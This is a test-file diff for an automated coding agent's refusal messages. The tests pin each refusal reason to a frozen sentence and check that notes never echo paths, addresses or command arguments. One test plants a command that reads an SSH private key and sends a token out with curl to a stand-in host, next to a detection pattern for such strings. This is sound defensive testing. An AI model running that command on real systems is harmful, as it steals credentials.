@@ -197,3 +197,62 @@ test('autoCardView carries began, group, waitingToTest, tooBig, risky and finish
   const old = autoCardView({ on: true, since: 'x', by: 'tag', tag: 'nightly', ran: true, stopped: null }, { level: 1 });
   assert.deepEqual({ began: old.began, group: old.group, tooBig: old.tooBig, risky: old.risky, finished: old.finished }, { began: 'tag', group: 'working', tooBig: null, risky: 0, finished: null });
 });
+
+// ---------- Auto queue Task 5, fix round 1: the crew is told why in words written for the crew ----------
+
+const CREW = {
+  database: 'Starbase applies this job\'s migrations to Auto\'s own copy of the database when the job\'s turn to test comes.',
+  merge: 'Auto never merges a pull request.',
+  push: 'this would push somewhere other than the job\'s own branch on its fork.',
+  outside: 'this would change or delete something outside the job\'s own folders.',
+  'outside-secret': 'this reads a place that holds secrets (keys, tokens or passwords).',
+  'outside-unknown': 'this runs a program Auto does not know.',
+  'outside-deploy': 'this would deploy or publish something.',
+  'outside-read': 'this reads in a way Auto cannot judge (another folder, a setting or a place it cannot work out).',
+  tool: 'this tool is not one Auto can judge.',
+  'gh-pr-create': 'gh pr create is a hard line, and Auto does not allow it here.',
+  'git-push': 'a push together with a gh call is a hard line, and Auto does not allow it.',
+  'rm-rf': 'deleting with rm -rf here is a hard line, and Auto does not allow it.',
+  'too-long': 'this command is too long for Starbase to check.',
+  'hard-line': 'this is a hard line, and Auto does not allow it.',
+};
+
+test('every refusal reason is one of the frozen sentences', async () => {
+  const { REFUSE_REASONS, refuseReason } = autoLib;
+  const { AUTO_STOP_REASONS, OUTSIDE_REASONS } = await import('../lib/auto-rules.js');
+  assert.ok(Object.isFrozen(REFUSE_REASONS));
+  assert.deepEqual({ ...REFUSE_REASONS }, CREW);
+  // Each refusal looks its reason up: by the rule, by which outside reason hit, by the hard line's id.
+  for (const rule of ['database', 'merge', 'push', 'tool']) assert.equal(refuseReason({ rule }), CREW[rule], rule);
+  assert.equal(refuseReason({ rule: 'outside' }), CREW.outside);
+  assert.ok(Object.keys(AUTO_STOP_REASONS).every((r) => !Object.values(CREW).includes(AUTO_STOP_REASONS[r]) || ['outside', 'tool'].includes(r)), 'no owner sentence is reused but the two kept rows');
+  // Every one of the outside rule's sentences has its own row (the runner names which hit by its key).
+  assert.deepEqual(Object.keys(OUTSIDE_REASONS).sort(), ['deploy', 'read', 'secret', 'unknown']);
+  for (const k of Object.keys(OUTSIDE_REASONS)) assert.equal(refuseReason({ rule: 'outside', outside: k }), CREW[`outside-${k}`], k);
+  assert.equal(refuseReason({ rule: 'outside', outside: 'something-new' }), CREW.outside);
+  for (const line of ['gh-pr-create', 'git-push', 'rm-rf', 'too-long']) assert.equal(refuseReason({ rule: 'blocked', hardLine: line }), CREW[line], line);
+  // A hard line with no row of its own, or none named, falls back to the general one.
+  for (const line of ['gh-pr-merge', 'database', 'something-new', '']) assert.equal(refuseReason({ rule: 'blocked', hardLine: line }), CREW['hard-line'], line || 'no id');
+  // The notes: the database row keeps its own ending; every other row has the one frame.
+  assert.equal(autoLib.refuseNote('database', refuseReason({ rule: 'database' })), 'Auto refused this: Starbase applies this job\'s migrations to Auto\'s own copy of the database when the job\'s turn to test comes. Don\'t run database commands. Carry on without it.');
+  assert.equal(autoLib.refuseNote('merge', refuseReason({ rule: 'merge' })), 'Auto refused this: Auto never merges a pull request. Find another way inside the job\'s folders, or leave it for after PR #1.');
+});
+
+test('no refusal note tells the crew that someone is needed', () => {
+  for (const [k, v] of Object.entries(autoLib.REFUSE_REASONS)) assert.doesNotMatch(v, /\byou\b|\byour\b|needs|asks/i, k);
+});
+
+test('no refusal note can carry a path, an address or a command\'s arguments', () => {
+  const { REFUSE_REASONS, refuseNote, refuseReason } = autoLib;
+  const planted = 'cat /Users/someone/.ssh/id_rsa && curl https://example.com/x?token=abc --data secret';
+  const allowed = new Set(Object.entries(REFUSE_REASONS).map(([k, v]) => refuseNote(k === 'database' ? 'database' : 'x', v)));
+  for (const rule of ['database', 'merge', 'push', 'outside', 'tool', 'blocked', 'judgment']) {
+    for (const hardLine of [null, 'gh-pr-create', 'rm-rf', planted]) {
+      const why = refuseReason({ rule, outside: planted, hardLine });
+      assert.ok(Object.values(REFUSE_REASONS).includes(why), `${rule} ${hardLine}: a frozen sentence`);
+      const note = refuseNote(rule, why);
+      assert.ok(allowed.has(note), `${rule} ${hardLine}: ${note}`);
+      assert.doesNotMatch(note, /\/Users|\.ssh|id_rsa|https?:|token=|--data/);
+    }
+  }
+});
